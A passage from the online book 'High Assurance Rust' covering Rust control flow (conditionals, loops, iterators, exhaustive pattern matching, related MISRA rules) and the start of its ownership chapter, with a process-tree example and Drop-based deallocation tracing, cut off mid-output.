<p><strong>[RR, Directive 4.13]</strong> Functions operating on a resource must be called in the correct sequence<sup class="footnote-reference" id="fr-MISRA_2012-1"><a href="#footnote-MISRA_2012">21</a></sup></p>
<p>We'll cover Rust implementation of the typestate pattern in a future appendix section.</p>
</blockquote>
<hr>
<ol class="footnote-definition"><li id="footnote-RustInfluence">
<p><a href="https://doc.rust-lang.org/reference/influences.html"><em>The Rust Reference: Influences</em></a>. The Rust Team (2021). <a href="#fr-RustInfluence-1">↩</a></p>
</li>
<li id="footnote-TockOS">
<p><a href="https://www.tockos.org/"><em>Tock</em></a>. Tock OS (Accessed 2022). Operating systems, perhaps the quintessential example of systems software, are a domain for which Rust is well-suited. There are several OSs written in Rust, Tock is one of them. <a href="#fr-TockOS-1">↩</a></p>
</li>
<li id="footnote-Epoch">
<p><a href="https://www.unixtimestamp.com/"><em>The Current Epoch Unix Timestamp</em></a>. Dan's Tools (Accessed 2022). <a href="#fr-Epoch-1">↩</a></p>
</li>
<li id="footnote-EnumAside">
<p>Rust also lets us define methods and associated functions on enums - we're not restricted to structs. But structs are more commonly used, many programming problems don't require representing groups of data that have multiple distinct variants. <a href="#fr-EnumAside-1">↩</a></p>
</li>
<li id="footnote-LinuxTaskStruct">
<p>Real OSs have much more complex task structures, our examples in this section are greatly simplified. If interested, you can check out the source code for Linux's <code>task_struct</code> <a href="https://github.com/torvalds/linux/blob/4f12b742eb2b3a850ac8be7dc4ed52976fc6cb0b/include/linux/sched.h#L728">here</a>. <a href="#fr-LinuxTaskStruct-1">↩</a></p>
</li>
<li id="footnote-ChromeProc">
<p><a href="https://dev.chromium.org/developers/design-documents/process-models"><em>Process Models</em></a>. The Chromium Project (Accessed 2022). <a href="#fr-ChromeProc-1">↩</a></p>
</li>
<li id="footnote-DataEncap">
<p><a href="https://en.wikipedia.org/wiki/Data_encapsulation"><em>Data encapsulation</em></a>. Wikipedia (Accessed 2022). <a href="#fr-DataEncap-1">↩</a></p>
</li>
<li id="footnote-Composition">
<p><a href="https://en.wikipedia.org/wiki/Composition_over_inheritance"><em>Composition over inheritance</em></a>. Wikipedia (Accessed 2022). <a href="#fr-Composition-1">↩</a></p>
</li>
<li id="footnote-TraitDebug">
<p><a href="https://doc.rust-lang.org/std/fmt/trait.Debug.html"><em>Trait <code>std::fmt::Debug</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitDebug-1">↩</a> <a href="#fr-TraitDebug-2">↩2</a> <a href="#fr-TraitDebug-3">↩3</a> <a href="#fr-TraitDebug-4">↩4</a></p>
</li>
<li id="footnote-TraitAead">
<p><a href="https://docs.rs/aead/latest/aead/trait.Aead.html"><em>Trait <code>aead::Aead</code></em></a>. RustCrypto organization (Accessed 2022). <a href="#fr-TraitAead-1">↩</a></p>
</li>
<li id="footnote-AEAD">
<p><a href="https://en.wikipedia.org/wiki/Authenticated_encryption"><em>Authenticated encryption</em></a>. Wikipedia (Accessed 2022). <a href="#fr-AEAD-1">↩</a></p>
</li>
<li id="footnote-TotalOrder">
<p><a href="https://en.wikipedia.org/wiki/Total_order">Total order</a> Wikipedia (Accessed 2022). <a href="#fr-TotalOrder-1">↩</a></p>
</li>
<li id="footnote-Ord">
<p><a href="https://doc.rust-lang.org/std/cmp/trait.Eq.html"><em>Trait <code>std::cmp::Ord</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-Ord-1">↩</a> <a href="#fr-Ord-2">↩2</a></p>
</li>
<li id="footnote-VecSort">
<p><a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.sort"><em><code>sort</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-VecSort-1">↩</a></p>
</li>
<li id="footnote-SchedAlg">
<p><a href="https://wiki.osdev.org/Scheduling_Algorithms"><em>Scheduling Algorithms</em></a>. OSDev Wiki (2021). <a href="#fr-SchedAlg-1">↩</a></p>
</li>
<li id="footnote-TraitOrd">
<p><a href="https://doc.rust-lang.org/std/cmp/trait.Eq.html"><em>Trait <code>std::cmp::Ord</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitOrd-1">↩</a></p>
</li>
<li id="footnote-TraitPartialOrd">
<p><a href="https://doc.rust-lang.org/std/cmp/trait.PartialOrd.html"><em>Trait <code>std::cmp::PartialOrd</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitPartialOrd-1">↩</a></p>
</li>
<li id="footnote-TraitPartialEq">
<p><a href="https://doc.rust-lang.org/std/cmp/trait.PartialEq.html"><em>Trait <code>std::cmp::PartialEq</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitPartialEq-1">↩</a></p>
</li>
<li id="footnote-TraitEq">
<p><a href="https://doc.rust-lang.org/std/cmp/trait.Eq.html"><em>Trait <code>std::cmp::Eq</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitEq-1">↩</a></p>
</li>
<li id="footnote-VecSortByKey">
<p><a href="https://doc.rust-lang.org/std/primitive.slice.html#method.sort_by_key"><em><code>sort_by_key</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-VecSortByKey-1">↩</a></p>
</li>
<li id="footnote-MISRA_2012">
<p><em>MISRA C: 2012 Guidelines for the use of the C language in critical systems (3rd edition)</em>. MISRA (2019). <a href="#fr-MISRA_2012-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="rust-control-flow-3-of-6"><a class="header" href="#rust-control-flow-3-of-6">Rust: Control Flow (3 of 6)</a></h1>
<p>Almost<sup class="footnote-reference" id="fr-BranchProg-1"><a href="#footnote-BranchProg">1</a></sup> any useful program is going to make some decision based on a condition, or execute some logic multiple times.
Thus every imperative programming language offers some mechanism for determining <em>control flow</em>: deciding the order in which individual statements get executed.</p>
<p>Languages tend to settle on the same handful of constructs for expressing control flow.
Rust is no exception.
Its <em>pattern matching</em> may be new to you depending on what language you're coming from, but its conditional statements and loops should feel familiar.</p>
<h2 id="conditional-statements"><a class="header" href="#conditional-statements">Conditional Statements</a></h2>
<p>The <code>if</code> and <code>else</code> keywords work much like you'd expect.</p>
<pre><pre class="playground"><code class="language-rust">fn conditional_print(num: usize) {
    if num &gt; 10 {
        println!("{} is greater than 10.", num);
    } else if num % 2 == 0 {
        println!("{} is even.", num);
    } else {
        println!("{} is odd.", num);
    }
}

fn main() {
    conditional_print(11);
    conditional_print(4);
    conditional_print(5);
}</code></pre></pre>
<p>The above outputs:</p>
<pre><code class="language-ignore">11 is greater than 10.
4 is even.
5 is odd.
</code></pre>
<p>What differentiates Rust is that the condition after the <code>if</code> keyword <em>must</em> evaluate to a <code>bool</code> type.
There's no implicit casting allowed.
This strictness helps obey another MISRA rule:</p>
<blockquote>
<p><strong>[AR, Rule 14.4]</strong> <em>If</em> expressions must evaluate to boolean types<sup class="footnote-reference" id="fr-MISRA_2012-1"><a href="#footnote-MISRA_2012">2</a></sup></p>
</blockquote>
<p>Many other languages don't enforce strict typing for conditional statements.</p>
<ul>
<li>
<p>In Python, a <code>None</code> value is implicitly cast to <code>false</code> if a condition evaluates to it.</p>
</li>
<li>
<p>Likewise, in C, a zero integer is implicitly cast to <code>false</code> (and a non-zero is cast to <code>true</code>).</p>
</li>
</ul>
<p>This doesn't hamper our ability to express a condition in Rust.
<code>x == None</code> and <code>y != 0</code> can still be written out explicitly.
But it does eliminate one potential source of error.</p>
<h2 id="while-loops"><a class="header" href="#while-loops">While Loops</a></h2>
<p>The <code>while</code> keyword lets us continue executing a loop as long as a boolean condition holds.
The below prints a countdown from 10 to 1:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut countdown = 10;

while countdown &gt; 0 {
    println!("{}...", countdown);
    countdown -= 1;
}
<span class="boring">}</span></code></pre></pre>
<p>Rust doesn't support "do while" loops directly, but the same logic can be implemented with the <code>loop</code> and <code>break</code> keywords.
An equivalent countdown could be implemented as:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut countdown = 10;

loop {
    println!("{}...", countdown);
    countdown -= 1;
    if countdown == 0 {
        break;
    }
}
<span class="boring">}</span></code></pre></pre>
<h2 id="for-loops"><a class="header" href="#for-loops">For Loops</a></h2>
<p>The <code>for</code> keyword enables looping over any <em>iterable</em>.
Take a range for example.
The below prints the numbers 0 through 9:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>for i in 0..10 {
    println!("{}", i);
}
<span class="boring">}</span></code></pre></pre>
<p>What if we want to access the elements of a collection in a loop?
On the surface, our <code>for</code> syntax seems to "just work":</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::collections::{HashSet, BTreeSet};

// List
let list = vec![3, 2, 1];

println!("Iterating over vector:");

for item in list {
    println!("list item: {}", item);
}

// Ordered set
let mut o_set = BTreeSet::new();
o_set.insert(3);
o_set.insert(2);
o_set.insert(1);

println!("\nIterating over ordered set:");

for elem in o_set {
    println!("set element: {}", elem);
}

// Hash set
let mut h_set = HashSet::new();
h_set.insert(3);
h_set.insert(2);
h_set.insert(1);

println!("\nIterating over hash set:");

for elem in h_set {
    println!("set element: {}", elem);
}
<span class="boring">}</span></code></pre></pre>
<p>But consider the output of the above:</p>
<pre><code class="language-ignore">Iterating over vector:
list item: 3
list item: 2
list item: 1

Iterating over ordered set:
set element: 1
set element: 2
set element: 3

Iterating over hash set:
set element: 2
set element: 3
set element: 1
</code></pre>
<p>Each collection has its own strategy for accessing elements:</p>
<ul>
<li><code>Vec</code> (a list) returns its values in the order they were inserted.</li>
<li><code>BTreeSet</code> (an ordered set) returns values in sorted order, relative to each other.</li>
<li><code>HashSet</code> (a hash set) doesn't have any notion of order - either sort or insertion.</li>
</ul>
<p>Under-the-hood, each collection implements its own <em>iterator</em>.
Each has its own logic, but shares a common interface: the <code>Iterator</code> trait<sup class="footnote-reference" id="fr-TraitIterator-1"><a href="#footnote-TraitIterator">3</a></sup>.
The <code>for</code> loop leverages this interface to perform traversal of the underlying data structure.</p>
<p>Iterators are a key part of idiomatic Rust, we'll dedicate an entire chapter to implementing our own.
For now, know that they enable a world of conveniences.
like enumeration:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let list = vec![3, 2, 1];

for (i, item) in list.iter().enumerate() {
    println!("list item {}: {}", i, item);
}

// Prints:
//
// list item 0: 3
// list item 1: 2
// list item 2: 1
<span class="boring">}</span></code></pre></pre>
<p>And functional transformations:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let list = vec![3, 2, 1];

let triple_list: Vec&lt;_&gt; = list.iter().map(|x| x * 3).collect();

for item in triple_list {
    println!("triple_list item: {}", item);
}

// Prints:
// triple_list item: 9
// triple_list item: 6
// triple_list item: 3
<span class="boring">}</span></code></pre></pre>
<p>Iterators also prevent common errors, like Out-Of-Bounds (OOB) indexing.
The help us comply with:</p>
<blockquote>
<p><strong>[AR, Rule 14.2]</strong> <em>for</em> loops must be well-formed<sup class="footnote-reference" id="fr-MISRA_2012-2"><a href="#footnote-MISRA_2012">2</a></sup></p>
</blockquote>
<h2 id="pattern-matching"><a class="header" href="#pattern-matching">Pattern Matching</a></h2>
<p>In its simplest usage, pattern matching is akin to C's <code>switch</code> statement - we chose one action from a finite set.</p>
<p>We saw <code>match</code>-ing on <code>enum</code> variants in the previous section.
This can be a convenient way to take different actions based on domain-specific context.
To review:</p>
<pre><code class="language-rust ignore">#[derive(Debug)]
pub enum State {
    Running,
    Stopped,
    Sleeping,
}

fn do_something_based_on_state(curr_state: State, pid: u32) {
    match curr_state {
        State::Running =&gt; stop_running_process(pid),
        State::Stopped =&gt; restart_stopped_process(pid),
        State::Sleeping =&gt; wake_sleeping_process(pid),
    }
}</code></pre>
<p>Unlike a C <code>switch</code>, pattern matching allows us to specify a list of <em>expressions</em> and a corresponding action for each.
Expressions can encode relatively complex conditions succinctly.
For example:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = 10;

match x {
    1 | 2 | 3 =&gt; println!("number is 1 or 2 or 3"),
    4..=10 =&gt; println!("number is between 4 and 10 inclusive"),
    x if x * x &lt; 250 =&gt; println!("number squared is less than 250"),
    _ =&gt; println!("number didn't meet any previous condition!"),
}
<span class="boring">}</span></code></pre></pre>
<ul>
<li>
<p>The 1st <em>match arm</em> (<code>1 | 2 | 3 =&gt; ...</code>) specifies three literal values. It triggers if the matched variable, <code>x</code>, equals any of the three.</p>
</li>
<li>
<p>The 2nd arm specifies a range, 4 to 10 inclusive. It triggers if <code>x</code> is any value within the range.</p>
</li>
<li>
<p>The 3rd arm uses a <em>guard expression</em>. It triggers if <code>x</code> multiplied by itself is less than 250.</p>
</li>
<li>
<p>The 4th and final arm is a <em>default case</em>. It matches <em>anything</em> using the wildcard <code>_</code>. It's only triggered if none of the previous cases trigger.</p>
</li>
</ul>
<p>Note that an input can't match multiple arms, only the first pattern it conforms to.
Thus order matters.</p>
<p>Rust also requires matches to be <em>exhaustive</em>, meaning the programmer has to handle every possible case.
Exhaustive matching of <code>State</code> variants in the first example was easy, there are only three: <code>Running</code>, <code>Stopped</code>, and <code>Sleeping</code>.</p>
<p>In the second example,<code>let x = 10;</code> didn't specify a type for <code>x</code>.
So the compiler inferred <code>i32</code> by default.
Exhaustively matching every possible value of a 32-bit unsigned integer would be tedious - instead, each of our patterns covers a subset of possible values.</p>
<p>The fourth pattern, a wildcard default, is required to ensure we don't miss anything.
If that line was omitted, we couldn't handle the case where <code>x</code> is <code>16</code>, for example.</p>
<p>The exhaustiveness requirement ensures any <code>match</code> we write gracefully handles any possible input, which meets the spirit of another MISRA rule:</p>
<blockquote>
<p><strong>[AR, Rule 16.4]</strong> Switch statements must have a default case<sup class="footnote-reference" id="fr-MISRA_2012-3"><a href="#footnote-MISRA_2012">2</a></sup></p>
</blockquote>
<p>While the rule is specific to C's <code>switch</code> statement, the idea robust of matching carries over - we should never accidentally "fall through" a <code>switch</code>/<code>match</code> without taking an appropriate action.</p>
<h2 id="condensed-pattern-matching"><a class="header" href="#condensed-pattern-matching">Condensed Pattern Matching</a></h2>
<p>Rust offers constructs for condensing pattern matching to a single, conditional action - triggered when a specific pattern fits (ignoring the rest).
If you see <code>if let</code> and <code>while let</code> in Rust code, it's a shorthand for "drilling down" to a single <code>match</code> arm.</p>
<p>This syntax can be obtuse when starting out, so we'll gradually introduce it later in the book - in the context of a larger program.
As a preview, consider this code (assume we're using our <code>State</code> enum from before):</p>
<pre><code class="language-rust ignore">let curr_state = State::Running;

match curr_state {
    State::Running =&gt; println!("Process is running!"),
    State::Stopped =&gt; {},   // Do nothing
    State::Sleeping =&gt; {},  // Do nothing
};</code></pre>
<p>It's equivalent to this shorthand:</p>
<pre><code class="language-rust ignore">let curr_state = State::Running;

if let State::Running = curr_state {
    println!("Process is running!");
}</code></pre>
<p>Notice how we print a message only for a <code>Running</code> state, but we don't have to exhaustively <code>match</code> different cases.
Instead, <code>if let</code> allows conditional action only for a specific <code>enum</code> variant.</p>
<p>Aren't we losing robustness by ignoring the other cases, in light of the previous MISRA rule?
Perhaps surprisingly, not quite.</p>
<ul>
<li>
<p><code>if let</code> is like any other <code>if</code> statement in that the body is only executed if a specific condition is true. By design, it's not intended to be exhaustive. <code>if</code> only "cares" about one case. And that's obvious to a reader.</p>
</li>
<li>
<p>A <code>match</code> supports multiple patterns and doesn't know which its input will trigger. By design, it's responsible for handling all of them. So the compiler enforces exhaustiveness. Something a reader might otherwise miss.</p>
</li>
</ul>
<p>Deciding whether <code>match</code> or <code>if let</code> is appropriate depends on the context of the broader program.</p>
<h2 id="takeaway-9"><a class="header" href="#takeaway-9">Takeaway</a></h2>
<p>Rust's control flow constructs aren't vastly different from other programming languages.
<code>while</code> loops work like you'd expect, <code>for</code> loops are backed by iterators, "do while" can be emulated with alternative syntax.
There's a bit more strictness - conditions must evaluate to booleans and pattern matching must be exhaustive if not using <code>if let</code>.
Rust encourages a notion of correctness.</p>
<p>Pattern matching may be new to you, depending on your background.
Its uses vary from simple switching on variants to complex matching of intricate patterns.
But you probably won't need complex patterns often.
And when you do, you'll be glad the feature exists!</p>
<p>We've covered data representation and control flow.
It's time to dig into what makes Rust unique.
The language's most distinctive and novel feature: ownership.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-BranchProg">
<p><a href="https://dev.to/jobinrjohnson/branchless-programming-does-it-really-matter-20j4"><em>Branchless programming. Does it really matter?</em></a>. Jobin Johnson (2021). <a href="#fr-BranchProg-1">↩</a></p>
</li>
<li id="footnote-MISRA_2012">
<p><em>MISRA C: 2012 Guidelines for the use of the C language in critical systems (3rd edition)</em>. MISRA (2019). <a href="#fr-MISRA_2012-1">↩</a> <a href="#fr-MISRA_2012-2">↩2</a> <a href="#fr-MISRA_2012-3">↩3</a></p>
</li>
<li id="footnote-TraitIterator">
<p><a href="https://doc.rust-lang.org/std/iter/trait.Iterator.html"><em>Trait <code>std::iter::Iterator</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitIterator-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="rust-ownership-principals-4-of-6"><a class="header" href="#rust-ownership-principals-4-of-6">Rust: Ownership Principals (4 of 6)</a></h1>
<p>Before we get into the mechanics of ownership, we should understand its motivation: managing memory.</p>
<p>Allocating memory is often easy, it happens at variable declaration.
Fixed-size types (e.g. <code>[T; N]</code>) can be allocated on the stack, dynamically-sized types (e.g. <code>Vec&lt;T&gt;</code>) must be allocated on the heap.</p>
<p>De-allocating (aka "freeing") memory is where things get tricky.
Traditionally, there have been two strategies: automated garbage collection and manual memory management.
Rust introduces<sup class="footnote-reference" id="fr-Own-1"><a href="#footnote-Own">1</a></sup> ownership, a third approach.
The below table offers an approximate comparison:</p>
<div class="table-wrapper"><table><thead><tr><th>Memory Management</th><th>Fast?</th><th>Safe?</th><th>Tradeoff</th><th>Example Languages</th></tr></thead><tbody>
<tr><td>Garbage collection</td><td>No, unpredictable latency spikes<sup class="footnote-reference" id="fr-DiscGo-1"><a href="#footnote-DiscGo">2</a></sup></td><td>Yes</td><td>Unsuitable for real-time and/or embedded systems</td><td>Go, Java, Python, Haskell, etc</td></tr>
<tr><td>Manual <code>malloc</code>/<code>new</code> and <code>free/delete</code></td><td>Yes</td><td>No, extreme UB risk<sup class="footnote-reference" id="fr-Sok:EWoM-1"><a href="#footnote-Sok:EWoM">3</a></sup></td><td>Significant source of security vulnerabilities for decades</td><td>C, C++</td></tr>
<tr><td>Ownership</td><td>Yes</td><td>Yes</td><td>Some constructs difficult to express</td><td>Rust</td></tr>
</tbody></table>
</div>
<p>Garbage collection's performance penalty warrants explanation.
The trouble is that collection is an <em>asynchronous</em> operation performed by a language runtime (another program bundled with yours).
That means your program gets "paused", at some difficult-to-predict interval, while other code runs.
The garbage collector eats up your CPU time, temporarily preventing your program from doing its job.</p>
<p>To really understand the safety downside of the manual management approach, we'll write a memory corruption exploit in the next chapter.</p>
<h2 id="introducing-ownership"><a class="header" href="#introducing-ownership">Introducing Ownership</a></h2>
<p>So what is <strong>ownership</strong>, in Rust?
At a high-level, it's a system for determining two pieces of information for every value in a program:</p>
<ol>
<li>
<p><strong>Valid scope:</strong> Where the value is valid and thus can be used.</p>
</li>
<li>
<p><strong>Access type:</strong> How a reference to a valid value can be used (read-only or writable).</p>
</li>
</ol>
<p>For references, that valid scope is called a <strong>lifetime</strong> in Rust.
Scope and lifetime are distinct concepts in most other languages.
But Rust's ownership model blurs the line:</p>
<ul>
<li>
<p>In C-family languages, you could access a variable by reference (because it's <em>in scope</em>) after it has already been freed (its <em>lifetime has ended</em>). The result is UB.</p>
</li>
<li>
<p>In Rust, that'd be a compile-time error. Only safe accesses are allowed, so scope and lifetime must overlap.</p>
</li>
</ul>
<p>To reason soundly, the compiler needs lifetime information for every value in the program.</p>
<ul>
<li>
<p>For values held directly (not behind a reference), lifetime is self-evident: a value must be alive if we currently own it.</p>
</li>
<li>
<p>For values behind a reference, the lifetime can often be inferred automatically (this is called <em>lifetime elision</em>). Other times, it must be explicitly annotated by the programmer.</p>
</li>
</ul>
<blockquote>
<p><strong>Are lifetimes present in the executable?</strong></p>
<p>No, lifetimes are a compile-time construct.
They don't appear in the machine code emitted, they're only used by the compiler to analyze a program for safety.
There's no runtime check or cost.</p>
</blockquote>
<p>Every value has a single, unique <strong>owner</strong>.
In the exact place in the source where the owner "drops" out of scope (the end of a function in which it was declared, for example), the lifetime of all its owned values ends.
So the compiler automatically inserts code to deallocate (aka "free") every owned value.</p>
<p>The result is precise, source-based control over memory and resource usage.
Comparable to what C and C++ offer, but with additional constraints traded for safety.</p>
<p>Those are the overarching principles, but there's nuance to the code.
In the form of rules and exceptions to them.
We'll explore ownership in detail, in both this section and the next.</p>
<blockquote>
<p><strong>What are memory leaks? By management strategy?</strong></p>
<p>A "memory leak" occurs if a value stops being used by the program, yet is never deallocated.
This is distinct from an "information leak" (accidentally exposing sensitive information).
Unlike an information leak, a memory leak is <strong>not a security issue</strong>.</p>
<p>It can, however, impact <strong>availability</strong>.
If a long-running process (e.g. a web server) leaks memory repeatedly (e.g. in a loop) it could eventually exhaust available RAM and be killed by the OS.</p>
<p>Leaks play out differently, depending on the memory management strategy:</p>
<ul>
<li>
<p><strong>Garbage collection</strong> - The collector code has no source-level info on value <em>lifetimes</em>. It must track references at runtime. And it must be conservative: a value that <em>might</em> be alive can't be re-claimed. Application-specific edge cases might keep value references around indefinitely, causing leaks.</p>
</li>
<li>
<p><strong>Manual</strong> - If the programmer ever forgets to manually free a value, even if some distant library code did the original allocation, we have a leak.</p>
</li>
<li>
<p><strong>Ownership</strong> - Leaks are only possible if the programmer opts into specific patterns, like <em>interior mutability</em> (see end of this section) with cyclical references.</p>
</li>
</ul>
</blockquote>
<h2 id="the-ownership-hierarchy"><a class="header" href="#the-ownership-hierarchy">The Ownership Hierarchy</a></h2>
<p>Because every value must have exactly one owner, we can think of ownership as a hierarchical tree.
Each node in the tree is a value, and a parent value <em>owns</em> its child values.</p>
<p>This roughly parallels the structure of an OS's process tree, where every process has exactly one parent.
It's not a perfect analogy<sup class="footnote-reference" id="fr-RoughAnalogy-1"><a href="#footnote-RoughAnalogy">4</a></sup>, but we're going to roll with it for this example - to cement the tree idea.
Trees are a central theme of this book, and a timeless idea in Computer Science.</p>
<p>Consider the following program, which uses a modified version of our prior <code>Proc</code> struct:</p>
<pre><pre class="playground"><code class="language-rust">#[derive(Debug)]
pub enum State {
    Running,
    Stopped,
    Sleeping,
}

#[derive(Debug)]
pub struct Proc {
    name: &amp;'static str,  // Process name (update: nicer print than u32 pid)
    state: State,        // Current state
    children: Vec&lt;Proc&gt;, // Children (update: now owned!)
}

impl Proc {
    pub fn new(name: &amp;'static str, state: State, children: Vec&lt;Proc&gt;) -&gt; Self {
        Proc {
            name,
            state,
            children,
        }
    }
}

fn main() {
    // Build process tree using 3 "moves" (more info soon):
    //
    // init
    //  |- cron
    //  |- rsyslogd
    //      |- bash
    //
    // Run "pstree -n -g" (in container) to see your OS's real process tree!

    // Alloc bash
    let bash = Proc::new("bash", State::Running, Vec::new());

    // Alloc rsyslogd, 1st move: bash -&gt; rsyslogd
    let rsyslogd = Proc::new("rsyslogd", State::Running, vec![bash]);

    // Alloc cron
    let cron = Proc::new("cron", State::Sleeping, Vec::new());

    // Alloc init, 2nd and 3rd moves: cron -&gt; init, rsyslogd -&gt; init
    let init = Proc::new("init", State::Running, vec![cron, rsyslogd]);

    // Print serialized tree to see ownership hierarchy
    dbg!(init);
}</code></pre></pre>
<p>The code builds a tree (<code>Proc</code> structs recursively containing other <code>Proc</code> structs) using a sequence of <strong>moves</strong>.
Moves are a way to <em>transfer ownership</em>.
We'll examine this code's move sequence in the next section.
Let's focus on the the final output now:</p>
<pre><code class="language-ignore">[src/main.rs:49] init = Proc {
    name: "init",
    state: Running,
    children: [
        Proc {
            name: "cron",
            state: Sleeping,
            children: [],
        },
        Proc {
            name: "rsyslogd",
            state: Running,
            children: [
                Proc {
                    name: "bash",
                    state: Running,
                    children: [],
                },
            ],
        },
    ],
}
</code></pre>
<p><code>Proc</code> derived the <code>Debug</code> trait, we can print a serialization of its contents using the <code>dbg!</code> macro.
All four <code>Proc</code> values printed above (named <code>init</code>, <code>cron</code>, <code>rsyslogd</code>, and <code>bash</code>) have an owner, which we can see in the printed tree.
Working bottom up, from the lowest and deepest level of nesting:</p>
<ul>
<li><code>bash</code> is owned by <code>rsyslogd</code>.</li>
<li><code>rsyslogd</code> is owned by <code>init</code>.</li>
<li><code>cron</code> is also owned by <code>init</code>.</li>
<li><code>init</code> isn't owned by another value, it's owned by the function <code>main</code>.</li>
</ul>
<p>We're going to work through how this ownership hierarchy impacts memory allocation and deallocation.</p>
<blockquote>
<p><strong>Static Lifetimes</strong></p>
<p>A nuance here is the <code>name</code> field.
Its type, <code>&amp;str</code>, is an immutable string reference.
<code>&amp;'static str</code>, means names are <em>string literals</em> whose lifetime (<code>'static</code>) is the <em>entire run</em> of the program, including before and after the <code>main</code> function (during which your OS does setup and teardown tasks).</p>
<p>None of our values <em>own</em> their string names (<code>"init"</code>, <code>"cron"</code>, <code>"rsyslogd"</code>, and <code>"bash"</code>).
They're just <em>borrowing</em> a reference (<code>&amp;</code>) to something that lives "forever" (until process termination) and doesn't need to be freed.
These strings are baked into the compiled binary.</p>
</blockquote>
<h3 id="allocation"><a class="header" href="#allocation">Allocation</a></h3>
<p>Memory for each <code>Proc</code> struct was allocated at variable declaration.
Each instance has a fixed size, only 48 bytes on a 64-bit machine<sup class="footnote-reference" id="fr-ProcPtr-1"><a href="#footnote-ProcPtr">5</a></sup>:</p>
<pre><code class="language-rust ignore">#[test]
fn test_size() {
    assert_eq!(core::mem::size_of::&lt;Proc&gt;(), 48);
}</code></pre>
<p>While a fixed size is convenient for allocation (we need only carve out a 48 byte chunk), it may seem odd.
After all, <code>Proc</code>'s <code>children</code> field is a dynamic list.
Each child is its own 48 byte instance, and each may have its own children.
<code>Proc</code>, as defined, is a recursive structure.
Moreover, <code>name</code> can have any length.
So how can size be fixed and so easily allocated?</p>
<p>Because <code>Proc</code>'s size calculation only includes a <em>pointer</em><sup class="footnote-reference" id="fr-ProcPtr-2"><a href="#footnote-ProcPtr">5</a></sup> to its name and its list of children.
Consider what a single <code>Proc</code> struct with no children looks like in memory, approximately:</p>
<br>
<p align="center">
  <img width="65%" src="chp3/proc_own_no_child.svg">
  <figure>
  <figcaption><center>Notional memory layout for a Proc struct with no children.</center></figcaption><br>
  </figure>
</p>
<p>Here's what it looks like with one child (which has no children of it's own):</p>
<br>
<p align="center">
  <img width="100%" src="chp3/proc_own_one_child.svg">
  <figure>
  <figcaption><center>Notional memory layout for a Proc struct with one child.</center></figcaption><br>
  </figure>
</p>
<p>The struct's size didn't change, just the contents of a slot pointed to.
Take note of the diagram above - this is roughly what memory looks like when the struct named <code>"proc_1"</code> owns the struct named <code>"proc_2"</code>.
We'll contrast this with another layout, in which one struct <em>borrows</em> a reference to another, soon.</p>
<h3 id="de-allocation"><a class="header" href="#de-allocation">De-allocation</a></h3>
<p>So how does ownership handle deallocation?</p>
<p>Using the hierarchy in the <code>dbg!</code> output we saw earlier.
<code>init</code> is the "top-level" value, it owns the other three.
And it's <em>dropped</em> when the <code>main</code> function finished running.
So the compiler adds freeing logic just after <code>dbg!(init);</code>, the last line of <code>main</code>.
A <em>destructor</em> is implemented for us, automatically.
By traversing the ownership hierarchy, this destructor knows how to clean up the other structs owned by <code>init</code>.</p>
<p>With just one more <code>println!</code>, we can trace the runtime deallocation sequence.
Rust supports running arbitrary logic before destructors, simply by implementing the <code>Drop</code> trait<sup class="footnote-reference" id="fr-Drop-1"><a href="#footnote-Drop">6</a></sup> for a type.
In case you need to run custom code to release an external resource (e.g. close a network or database connection) or similar.</p>
<p>In our case we'll print the <code>name</code> field and <code>Proc</code> struct's memory address on every drop:</p>
<pre><code class="language-rust ignore">impl Drop for Proc {
    fn drop(&amp;mut self) {
        println!("De-alloc-ing \'{}\' Proc @ {:p}", self.name, self);
    }
}</code></pre>
<p>Running our program now outputs (after the serialized <code>dbg!</code> print):</p>
<pre><code class="language-ignore">De-alloc-ing 'init' Proc @ 0x7ffd4d149460
De-alloc-ing 'cron' Proc @ 0x560d2fbb0b10
